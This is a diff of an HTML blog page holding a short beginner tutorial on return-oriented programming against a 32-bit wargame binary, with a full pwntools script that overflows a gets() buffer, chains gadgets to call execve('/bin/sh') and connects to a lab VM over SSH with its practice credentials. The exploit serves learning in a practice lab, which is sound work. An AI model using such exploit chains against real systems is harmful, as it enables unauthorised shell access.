@@ -1,135 +1,125 @@
 <html>
  <head>
 <title> ROP-0  </title>
-
- <link rel="stylesheet" type="text/css" href="test1.css" />
- <link rel="stylesheet" type="text/css" href="fonts.css" />
-</head>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha256-916EbMg70RQy9LHiGkXzG8hSg9EdNy97GazNG/aiY1w=" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.7.0/styles/github-gist.min.css" integrity="sha256-tAflq+ymku3Khs+I/WcAneIlafYgDiOQ9stIHH985Wo=" crossorigin="anonymous" />
 <style>
-
-      body {background-color:white;
-	border-bottom:1px solid #bfbfbf
-         line-height:1.5em;
-	color:#222}
- 
-   p{color:black;
-        /*font-style: italic;
-       font-family: "Times New Roman";*/
-      letter-spacing: 2px;
-       font-size: 20px;
-       margin-top: 10px;
-       margin-bottom: 10px;
-        margin-right: 150px;
-       margin-left: 150px; 
-       }
-
-
-
-    h1{ color:black;
-         font-style: italic;
-        font-size:2.2em;
-	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
-	font-weight:normal;
-	line-height:1.2em;
-	margin-bottom:0.6667em
-        margin-right: 150px;
-       margin-left: 150px;}
-
-code { 
-display: block; white-space: pre-wrap; 
-border: 1px solid #000; 
-padding: 10px; 
-line-height: 1.5em; 
-font-family: "Lucida Console", Monaco, monospace; 
-} 
-.code-str 
-{ color:#ff33d4; } 
- .code-comment { color:#3c33ff; } 
- .code-key { color:#9933ff; }
- .code-brown{color:#ba4a00} 
-
+.top {
+		background:
+		radial-gradient(black 15%, transparent 16%) 0 0,
+		radial-gradient(black 15%, transparent 16%) 8px 8px,
+		radial-gradient(rgba(255,255,255,.1) 15%, transparent 20%) 0 1px,
+		radial-gradient(rgba(255,255,255,.1) 15%, transparent 20%) 8px 9px;
+	background-color:#282828;
+	background-size:16px 16px;
+		width:100%;
+		height:30%;
+	}
 
 </style>
+</head>
 <body>
 
-<script src="null.js"></script>
+<div class = "top"></div> 
 
-<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
- <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
- <p style="color:white;font-size:2.2em;"> ROP-0 </p>
- </div>
- </div>
+<div id="doc" class="markdown-body container-fluid comment-enabled" style="position: relative;"><h1 id="Baby-ROP">Baby ROP</h1><p>Return-oriented programming (ROP) is an exploit which re-uses the text segment so that we can bypass NX &amp;&amp; ASLR !!!</p><p>Here you have to use a GADGET which is an instruction ending with ret so that it ensures we doesn’t loose control over eip</p><p>You can find the gadget using</p><p><code>rp++ -f bin1 -r1 | grep "pop rsi"</code></p><p>This binary takes input via gets so overwrite eip and use tha gadget so that we can make a syscall of excecve(’/bin/sh’)</p><p><strong>NOTE:</strong> eax should cantain no-11 ,ebx - pointer to ‘/bin/sh’ ecx – 0 (occasionally double pointer to ‘/bin/sh’) &amp;&amp; edx=0</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
+<span data-linenumber="2"></span>
+<span data-linenumber="3"></span>
+<span data-linenumber="4"></span>
+<span data-linenumber="5"></span>
+<span data-linenumber="6"></span>
+<span data-linenumber="7"></span>
+<span data-linenumber="8"></span>
+<span data-linenumber="9"></span>
+<span data-linenumber="10"></span>
+<span data-linenumber="11"></span>
+<span data-linenumber="12"></span>
+<span data-linenumber="13"></span>
+<span data-linenumber="14"></span>
+<span data-linenumber="15"></span>
+<span data-linenumber="16"></span>
+<span data-linenumber="17"></span>
+<span data-linenumber="18"></span>
+<span data-linenumber="19"></span>
+<span data-linenumber="20"></span>
+<span data-linenumber="21"></span>
+<span data-linenumber="22"></span>
+<span data-linenumber="23"></span>
+<span data-linenumber="24"></span>
+<span data-linenumber="25"></span>
+<span data-linenumber="26"></span>
+<span data-linenumber="27"></span>
+<span data-linenumber="28"></span>
+<span data-linenumber="29"></span>
+<span data-linenumber="30"></span>
+<span data-linenumber="31"></span>
+<span data-linenumber="32"></span>
+<span data-linenumber="33"></span>
+<span data-linenumber="34"></span>
+<span data-linenumber="35"></span>
+<span data-linenumber="36"></span>
+<span data-linenumber="37"></span>
+<span data-linenumber="38"></span>
+<span data-linenumber="39"></span>
+<span data-linenumber="40"></span>
+<span data-linenumber="41"></span>
+<span data-linenumber="42"></span>
+<span data-linenumber="43"></span>
+<span data-linenumber="44"></span>
+<span data-linenumber="45"></span>
+<span data-linenumber="46"></span>
+<span data-linenumber="47"></span>
+<span data-linenumber="48"></span></div><div class="code"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+context.bits=<span class="hljs-number">32</span>
 
 
- <br> <br>  <br>          
 
-<h1 class="post-title"> My first ROP exploit !! </h1>
-   
- <br> 
-
-<p> Return-oriented programming (ROP) is an exploit which re-uses the text segment so that we can bypass NX && ASLR !!!  <br>
-   
-      Here U have to use a GADGET which is an instruction ending with ret so that it ensures we doesn't loose control over eip <br>  
-    
-      U can find the gadget using rp++ -f level0 -r1 | grep "gadgets you need :)"
-     
-     <br>OK this binary takes input via gets so overwrite eip and use tha gadget so that we can make a syscall of excecve('/bin/sh') </p>
-
-<p><b> NOTE: eax should cantain no-11 ,ebx -- pointer to '/bin/sh' ecx -- 0 (occasionally double pointer to '/bin/sh') && edx=0 </b></p>
-
-<br>
-
-<code> 
-from pwn import *
-
-context.bits=32
-
-
-
-adress1=0x0806c1c3    # pop eax;ret
-adress2=0x080525ee   # pop ebx;ret
+adress1=<span class="hljs-number">0x0806c1c3</span>    <span class="hljs-comment"># pop eax;ret</span>
+adress2=<span class="hljs-number">0x080525ee</span>   <span class="hljs-comment"># pop ebx;ret</span>
  
-adress4=0x080525c6   # pop edx ;ret
-address5=0x08048105	#xchg ecx,eax
+adress4=<span class="hljs-number">0x080525c6</span>   <span class="hljs-comment"># pop edx ;ret</span>
+address5=<span class="hljs-number">0x08048105</span>	<span class="hljs-comment">#xchg ecx,eax</span>
 
-syscall=0x08052cf0   #  int 0x80;ret;
-adress9=0x08079191   # mov dword [edx],eax ; ret
-bssadress=0x80ca63c
+syscall=<span class="hljs-number">0x08052cf0</span>   <span class="hljs-comment">#  int 0x80;ret;</span>
+adress9=<span class="hljs-number">0x08079191</span>   <span class="hljs-comment"># mov dword [edx],eax ; ret</span>
+bssadress=<span class="hljs-number">0x80ca63c</span>
 
-payload= "A"*44
-payload+=pack(adress1)+pack(0)  # eax=0
-payload+=pack(address5)          #xchg ecx, eax
+payload= <span class="hljs-string">"A"</span>*<span class="hljs-number">44</span>
+payload+=pack(adress1)+pack(<span class="hljs-number">0</span>)  <span class="hljs-comment"># eax=0</span>
+payload+=pack(address5)          <span class="hljs-comment">#xchg ecx, eax</span>
 
-payload+=pack(adress4)+pack(bssadress) # edx = bss
+payload+=pack(adress4)+pack(bssadress) <span class="hljs-comment"># edx = bss</span>
 
-payload+=pack(adress1)+"/bin"  # eax='/bin'
+payload+=pack(adress1)+<span class="hljs-string">"/bin"</span>  <span class="hljs-comment"># eax='/bin'</span>
 
-payload+=pack(adress9)            # [edx]=eax
+payload+=pack(adress9)            <span class="hljs-comment"># [edx]=eax</span>
 
-payload+=pack(adress4)+pack(bssadress+4) # edx = bss+4
+payload+=pack(adress4)+pack(bssadress+<span class="hljs-number">4</span>) <span class="hljs-comment"># edx = bss+4</span>
 
-payload+=pack(adress1)+"/sh\x00"  # eax='/sh'
+payload+=pack(adress1)+<span class="hljs-string">"/sh\x00"</span>  <span class="hljs-comment"># eax='/sh'</span>
 
-payload+=pack(adress9)            # [edx]=eax
+payload+=pack(adress9)            <span class="hljs-comment"># [edx]=eax</span>
 
-payload+=pack(adress1)+pack(11)  # eax=11
+payload+=pack(adress1)+pack(<span class="hljs-number">11</span>)  <span class="hljs-comment"># eax=11</span>
 
 
-payload+=pack(adress2)+pack(bssadress) # ebx=(/bin/sh)*
-payload+=pack(adress4)+pack(0)+pack(syscall)+pack(adress1)+pack(1)+pack(syscall)
+payload+=pack(adress2)+pack(bssadress) <span class="hljs-comment"># ebx=(/bin/sh)*</span>
+payload+=pack(adress4)+pack(<span class="hljs-number">0</span>)+pack(syscall)+pack(adress1)+pack(<span class="hljs-number">1</span>)+pack(syscall)
 
-s=ssh(host='192.168.56.101',user='level0',password='warmup')
-p=s.process('level0')
+s=ssh(host=<span class="hljs-string">'192.168.56.101'</span>,user=<span class="hljs-string">'level0'</span>,password=<span class="hljs-string">'warmup'</span>)
+p=s.process(<span class="hljs-string">'level0'</span>)
 
-print p.recvuntil("?")
+<span class="hljs-keyword">print</span> p.recvuntil(<span class="hljs-string">"?"</span>)
 
 p.sendline(payload)
 
-print p.recvline()
+<span class="hljs-keyword">print</span> p.recvline()
 
 p.interactive()
+</div></div></code></pre></div>
 
- </code>
 
 </body>
 </html>
